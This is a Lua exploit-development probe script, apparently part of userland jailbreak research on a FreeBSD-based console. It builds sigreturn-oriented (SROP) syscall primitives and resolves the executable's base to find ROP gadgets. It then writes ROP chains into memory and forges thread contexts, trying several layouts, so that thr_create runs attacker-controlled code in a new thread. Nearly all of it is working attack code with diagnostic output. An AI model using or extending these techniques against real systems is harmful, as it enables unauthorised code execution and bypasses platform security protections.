-- CRASH_CLASS: MODERATE
-- PROBE 142l: Metadata shift — translate getcontext to thr_create format
--
-- Problem: getcontext writes at MC=0x40, thr_create reads at MC=0x10.
-- 142j-B tried getcontext + overwrite 80a ctrl regs → still rv=-1.
-- Root cause: FP metadata/mc_len at MC=0x40 positions are 0x30 bytes
-- from where thr_create expects them (MC=0x10 positions).
--
-- Fix: After getcontext, SHIFT the entire metadata+FP block down by 0x30
-- so thr_create finds valid data at its expected positions.
--
-- Also tests: what if thr_create actually uses MC=0x40 format (same as
-- getcontext)? Section [C] tests this: set RIP at BOTH positions,
-- use nanosleep (doesn't depend on RDX).

print("=== PROBE 142l: METADATA SHIFT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP helper (MC=0x40 for sigreturn)
local MC_S = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    if a3 then wq(srop_ctx + MC_S + 0x18, a3) end
    if a4 then wq(srop_ctx + MC_S + 0x50, a4) end
    if a5 then wq(srop_ctx + MC_S + 0x28, a5) end
    if a6 then wq(srop_ctx + MC_S + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot base + gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

-- Main TID
local tid_main_buf = gpu + 0x100
wq(tid_main_buf, uint64(0))
srop(432, ua(tid_main_buf))
local mtl = to_num(safe_rd(tid_main_buf))
print("main_TID=" .. mtl)

-- Timespec for 30s sleep
local tspec = gpu + 0x200
wq(tspec, uint64(30))
wq(tspec + 8, uint64(0))

local ts_half = memory.alloc(16)
wq(ts_half, uint64(0)); wq(ts_half + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts_half), uint64(0)) end)
end

--------------------------------------------------------------------
-- [A] Diagnostic: dump getcontext metadata at BOTH format positions
--------------------------------------------------------------------
print("")
print("--- [A] Metadata dump ---")
local diag = gpu + 0x10000
for off = 0, 0x4FF, 4 do wd(diag + off, 0) end
pcall(function() return sc_gc(uint64(diag)) end)

-- MC=0x40 format positions (where getcontext writes)
print("[A] getctx MC=0x40 positions:")
local gc_rip = safe_rq(diag + 0xE0)
print("[A]  mc_rip(+0xE0)=" .. hex(gc_rip))
local gc_cs = safe_rq(diag + 0xE8)
print("[A]  mc_cs (+0xE8)=" .. hex(gc_cs))
local gc_rflags = safe_rq(diag + 0xF0)
print("[A]  mc_rfl(+0xF0)=" .. hex(gc_rflags))
local gc_rsp = safe_rq(diag + 0xF8)
print("[A]  mc_rsp(+0xF8)=" .. hex(gc_rsp))
local gc_ss = safe_rq(diag + 0x100)
print("[A]  mc_ss (+0x100)=" .. hex(gc_ss))

-- mc_len and FP metadata at MC=0x40 positions
local gc_len = safe_rq(diag + 0x148)
print("[A]  mc_len(+0x148)=" .. hex(gc_len))
local gc_fpf = safe_rq(diag + 0x150)
print("[A]  mc_fpformat(+0x150)=" .. hex(gc_fpf))
local gc_own = safe_rq(diag + 0x158)
print("[A]  mc_ownedfp(+0x158)=" .. hex(gc_own))
local gc_fl2 = safe_rq(diag + 0x160)
print("[A]  mc_flags(+0x160)=" .. hex(gc_fl2))

-- MC=0x10 format positions (where thr_create reads)
print("[A] thr_create MC=0x10 positions:")
local tc_rip = safe_rq(diag + 0x90)
print("[A]  mc_rip(+0x90)=" .. hex(tc_rip))
local tc_cs = safe_rq(diag + 0x98)
print("[A]  mc_cs (+0x98)=" .. hex(tc_cs))
local tc_rflags = safe_rq(diag + 0xA0)
print("[A]  mc_rfl(+0xA0)=" .. hex(tc_rflags))
local tc_rsp = safe_rq(diag + 0xA8)
print("[A]  mc_rsp(+0xA8)=" .. hex(tc_rsp))
local tc_ss = safe_rq(diag + 0xB0)
print("[A]  mc_ss (+0xB0)=" .. hex(tc_ss))

local tc_len = safe_rq(diag + 0x118)
print("[A]  mc_len(+0x118)=" .. hex(tc_len))
local tc_fpf = safe_rq(diag + 0x120)
print("[A]  mc_fpformat(+0x120)=" .. hex(tc_fpf))
local tc_own = safe_rq(diag + 0x128)
print("[A]  mc_ownedfp(+0x128)=" .. hex(tc_own))
local tc_fl2 = safe_rq(diag + 0x130)
print("[A]  mc_flags(+0x130)=" .. hex(tc_fl2))

-- Also dump at mc_len-adjacent positions to find the right offset
print("[A] mc_len scan (non-zero qwords after +0xA0):")
for off = 0xA0, 0x180, 8 do
    local v = safe_rq(diag + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vl ~= 0 or vh ~= 0 then
            print(string.format("[A]  +0x%03X = %s", off, hex(v)))
        end
    end
end

--------------------------------------------------------------------
-- [B] Shifted metadata: copy from MC=0x40 to MC=0x10 positions
-- Shift = 0x30 (0x40 - 0x10)
-- Copy from ctx+0x108 onwards to ctx+0xD8 onwards (metadata area)
-- Then set control regs at MC=0x10 positions
--------------------------------------------------------------------
print("")
print("--- [B] Shifted metadata ---")

local ctx_b = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)

-- Shift metadata+FP block by -0x30
-- Source: MC=0x40 metadata starts after mc_ss at ctx+0x108
-- Dest: MC=0x10 metadata starts after mc_ss at ctx+0xD8
-- Actually, let me shift the ENTIRE block from mc_len onwards
-- MC=0x40 mc_len at ctx+0x148, MC=0x10 mc_len at ctx+0x118
-- Shift: copy from ctx+0x148 to ctx+0x118 (0x30 byte shift)
-- Copy enough to cover FP state (0x300 bytes should be plenty)
print("[B] Shifting metadata by -0x30 (gc_len=" .. hex(gc_len) .. ")")
for off = 0, 0x2FF, 8 do
    local v = safe_rq(ctx_b + 0x148 + off)
    if v then wq(ctx_b + 0x118 + off, v) end
end

-- Set thr_create control regs (MC=0x10)
wq(ctx_b + 0x90, g_ret)              -- mc_rip = ret gadget
wq(ctx_b + 0x98, uint64(0x43))       -- mc_cs = user mode
wq(ctx_b + 0xA0, uint64(0x202))      -- mc_rflags = IF set
wq(ctx_b + 0xB0, uint64(0x3B))       -- mc_ss = user data

-- ROP chain for nanosleep
local stack_b = gpu + 0x30000
for off = 0, 0x7FFF, 4 do wd(stack_b + off, 0) end
local rop_b = stack_b + 0x7000
wq(rop_b + 0x00, g_pop_rdi)
wq(rop_b + 0x08, ua(tspec))          -- rdi = timespec(30s)
wq(rop_b + 0x10, g_pop_rsi)
wq(rop_b + 0x18, uint64(0))          -- rsi = NULL
wq(rop_b + 0x20, g_pop_rax)
wq(rop_b + 0x28, uint64(240))        -- rax = nanosleep
wq(rop_b + 0x30, sc_addr)            -- syscall → sleep 30s
wq(rop_b + 0x38, g_pop_rdi)          -- after sleep: another nanosleep
wq(rop_b + 0x40, ua(tspec))
wq(rop_b + 0x48, g_pop_rsi)
wq(rop_b + 0x50, uint64(0))
wq(rop_b + 0x58, g_pop_rax)
wq(rop_b + 0x60, uint64(240))
wq(rop_b + 0x68, sc_addr)

wq(ctx_b + 0xA8, ua(rop_b))          -- mc_rsp = ROP chain

local tid_b = gpu + 0x40000
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating thread (shifted metadata + nanosleep)...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
local nbh, nbl = get_hi_lo(ntid_b)
print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. nbl)

for check = 1, 4 do
    msleep()
    if nbl ~= 0 and nbl ~= 0xDEADDEAD then
        local rv_k = srop(433, uint64(nbl), uint64(0))
        local kh, kl = get_hi_lo(rv_k)
        local tag = (kl == 0 and kh == 0) and "ALIVE!" or "dead"
        print("[B] check" .. check .. ": thr_kill=" .. hex(rv_k) .. " " .. tag)
        if kl == 0 and kh == 0 then
            print("[B] *** THREAD EXECUTION CONFIRMED! ***")
        end
    end
end

--------------------------------------------------------------------
-- [C] MC=0x40 format (same as getcontext): set RIP at ctx+0xE0,
-- RSP at ctx+0xF8. Use nanosleep (doesn't depend on RDX).
-- Previous tests with WAIT crashed because WAIT returned immediately
-- (wrong RDX from getcontext) → thread hit sc_addr+2 → crash.
-- nanosleep blocks regardless of RDX.
--------------------------------------------------------------------
print("")
print("--- [C] MC=0x40 format + nanosleep ---")

local ctx_c = gpu + 0x50000
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)

-- ROP for nanosleep
local stack_c = gpu + 0x60000
for off = 0, 0x7FFF, 4 do wd(stack_c + off, 0) end
local rop_c = stack_c + 0x7000
wq(rop_c + 0x00, g_pop_rdi)
wq(rop_c + 0x08, ua(tspec))
wq(rop_c + 0x10, g_pop_rsi)
wq(rop_c + 0x18, uint64(0))
wq(rop_c + 0x20, g_pop_rax)
wq(rop_c + 0x28, uint64(240))
wq(rop_c + 0x30, sc_addr)
wq(rop_c + 0x38, g_pop_rdi)          -- safety: loop nanosleep
wq(rop_c + 0x40, ua(tspec))
wq(rop_c + 0x48, g_pop_rsi)
wq(rop_c + 0x50, uint64(0))
wq(rop_c + 0x58, g_pop_rax)
wq(rop_c + 0x60, uint64(240))
wq(rop_c + 0x68, sc_addr)

-- Set at MC=0x40 format positions (where getcontext wrote)
wq(ctx_c + 0xE0, g_ret)              -- mc_rip (MC=0x40)
wq(ctx_c + 0xF8, ua(rop_c))          -- mc_rsp (MC=0x40)
-- CS/RFLAGS/SS stay from getcontext (already 0x43/0x202/0x3B)

-- ALSO set at MC=0x10 positions to cover both possibilities
wq(ctx_c + 0x90, g_ret)              -- mc_rip (MC=0x10)
wq(ctx_c + 0x98, uint64(0x43))       -- mc_cs (MC=0x10)
wq(ctx_c + 0xA0, uint64(0x202))      -- mc_rflags (MC=0x10)
wq(ctx_c + 0xA8, ua(rop_c))          -- mc_rsp (MC=0x10)
wq(ctx_c + 0xB0, uint64(0x3B))       -- mc_ss (MC=0x10)
wq(ctx_c + 0x118, uint64(0x480))     -- mc_len (MC=0x10)

-- AND shift FP metadata
for off = 0, 0x2FF, 8 do
    local v = safe_rq(ctx_c + 0x148 + off)
    if v then wq(ctx_c + 0x118 + off, v) end
end

local tid_c = gpu + 0x70000
wq(tid_c, uint64(0xDEADDEAD))

print("[C] Creating thread (both formats + nanosleep)...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
local ntid_c = safe_rq(tid_c)
local nch, ncl = get_hi_lo(ntid_c)
print("[C] ok=" .. tostring(ok_c) .. " rv=" .. tostring(rv_c) .. " tid=" .. ncl)

for check = 1, 4 do
    msleep()
    if ncl ~= 0 and ncl ~= 0xDEADDEAD then
        local rv_k = srop(433, uint64(ncl), uint64(0))
        local kh, kl = get_hi_lo(rv_k)
        local tag = (kl == 0 and kh == 0) and "ALIVE!" or "dead"
        print("[C] check" .. check .. ": thr_kill=" .. hex(rv_k) .. " " .. tag)
        if kl == 0 and kh == 0 then
            print("[C] *** THREAD ALIVE! ***")
        end
    end
end

--------------------------------------------------------------------
-- [D] Pure MC=0x40 format: NO 80a overwrites, only change RIP/RSP
-- at getcontext positions. If thr_create uses MC=0x40, this WILL
-- execute. The thread starts at g_ret and runs nanosleep ROP.
--------------------------------------------------------------------
print("")
print("--- [D] Pure MC=0x40 + nanosleep ---")

local ctx_d = gpu + 0x80000
for off = 0, 0x4FF, 4 do wd(ctx_d + off, 0) end
pcall(function() return sc_gc(uint64(ctx_d)) end)

local stack_d = gpu + 0x90000
for off = 0, 0x7FFF, 4 do wd(stack_d + off, 0) end
local rop_d = stack_d + 0x7000
wq(rop_d + 0x00, g_pop_rdi)
wq(rop_d + 0x08, ua(tspec))
wq(rop_d + 0x10, g_pop_rsi)
wq(rop_d + 0x18, uint64(0))
wq(rop_d + 0x20, g_pop_rax)
wq(rop_d + 0x28, uint64(240))
wq(rop_d + 0x30, sc_addr)
wq(rop_d + 0x38, g_pop_rdi)
wq(rop_d + 0x40, ua(tspec))
wq(rop_d + 0x48, g_pop_rsi)
wq(rop_d + 0x50, uint64(0))
wq(rop_d + 0x58, g_pop_rax)
wq(rop_d + 0x60, uint64(240))
wq(rop_d + 0x68, sc_addr)

-- ONLY set at MC=0x40 positions — pure getcontext format
wq(ctx_d + 0xE0, g_ret)              -- mc_rip
wq(ctx_d + 0xF8, ua(rop_d))          -- mc_rsp
-- CS(+0xE8)=0x43, RFLAGS(+0xF0)=0x202, SS(+0x100)=0x3B from getcontext

local tid_d = gpu + 0xA0000
wq(tid_d, uint64(0xDEADDEAD))

print("[D] Creating thread (pure MC=0x40)...")
local ok_d, rv_d = pcall(function()
    return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
end)
local ntid_d = safe_rq(tid_d)
local ndh, ndl = get_hi_lo(ntid_d)
print("[D] ok=" .. tostring(ok_d) .. " rv=" .. tostring(rv_d) .. " tid=" .. ndl)

for check = 1, 4 do
    msleep()
    local alive = to_num(sc20())
    if alive == 0 then
        print("[D] PROCESS DIED at check " .. check)
        break
    end
    if ndl ~= 0 and ndl ~= 0xDEADDEAD then
        local rv_k = srop(433, uint64(ndl), uint64(0))
        local kh, kl = get_hi_lo(rv_k)
        local tag = (kl == 0 and kh == 0) and "ALIVE!" or "dead"
        print("[D] check" .. check .. ": pid=" .. alive .. " thr_kill=" .. hex(rv_k) .. " " .. tag)
        if kl == 0 and kh == 0 then
            print("[D] *** THREAD EXECUTION VIA MC=0x40 CONFIRMED! ***")
        end
    end
end

--------------------------------------------------------------------
-- [E] sys624 delta across all thread creations
--------------------------------------------------------------------
print("")
print("--- [E] sys624 ---")
local s_now = srop(624)
local snh, snl = get_hi_lo(s_now)
print("[E] sys624=" .. snl)
print("[E] alive pid=" .. to_num(sc20()))

print("")
print("=== DONE ===")
